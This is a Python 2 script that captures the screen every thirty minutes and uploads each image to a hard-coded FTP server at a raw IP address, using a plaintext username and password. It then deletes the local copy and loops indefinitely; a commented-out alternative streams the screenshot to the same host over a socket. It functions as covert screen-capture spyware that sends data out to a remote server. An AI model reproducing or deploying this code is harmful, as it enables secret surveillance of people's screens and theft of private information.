#!/usr/bin/env python
#-*- coding:utf-8 -*-
import platform
import time
import ftplib
import os
import sys

os_type = platform.system()
pngDir = "pngLib"

pngname = ""
def grab_screen():
	global pngname
	if os_type == "windows":
		from PIL import Image,ImageGrab
		im = ImageGrab.grab()
		im.show()
	elif os_type == "Linux":
		import gtk.gdk
		w = gtk.gdk.get_default_root_window()
		sz = w.get_size()
		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
		if (pb!= None):
			pb.save(pngname,"png")
			print "saved screenshot png successfully!"
		else:
			print "Unable to get screenshot png!"
	elif os_type == "Darwin":
		os.system("screencapture %s"%(pngname))

def upload_to_server():
	import socket
	import sys
	HOST,PORT="27.126.181.90",12345

	f = open("screenshot.png",'rb')
	data = f.read()

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((HOST,PORT))
		sock.sendall(data)

		received = sock.recv(1024)
	finally:
		sock.close()

	print "Received: {}".format(received)

def upload_to_ftpServer():
	global pngname
	def is_file(ftp,filename):
		try:
			ftp.size(filename)
		except ftplib.error_perm, e:
			return False
		return True

	server="27.126.181.90"
	username="athenking"
	password="freedom"

	myFtp = ftplib.FTP(server,username,password)

	hasDirectory = False
	files = myFtp.nlst()
	for f in files:
		if not is_file(myFtp,f) and f == pngDir:
			hasDirectory = True

	if not hasDirectory:
		myFtp.mkd(pngDir)

	myFtp.cwd(pngDir)
	fc = open(pngname,'rb')
	myFtp.storbinary('STOR '+pngname,fc)
	fc.close()
	#remove current file
	os.remove(pngname)
	myFtp.quit()

def grabOnce():
	global pngname
	pngname = "%s.png"%(time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time())))
	grab_screen()
	# upload_to_server()
	upload_to_ftpServer()

def run_forever():
	while True:
		grabOnce()
		time.sleep(30*60)

# grabOnce()
run_forever()